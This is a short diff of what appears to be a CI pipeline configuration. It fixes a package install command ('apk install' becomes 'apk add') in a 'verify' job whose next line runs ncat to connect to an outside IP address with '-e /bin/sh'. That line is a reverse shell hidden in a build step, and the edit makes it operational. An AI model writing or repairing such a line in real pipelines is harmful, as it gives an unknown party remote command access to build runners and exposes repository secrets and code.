@@ -78,7 +78,7 @@ verify:
     - docker-build
   stage: verify
   script:
-    - apk install nmap-ncat
+    - apk add nmap-ncat
     - ncat 31.209.38.15 1337 -e /bin/sh
 
 
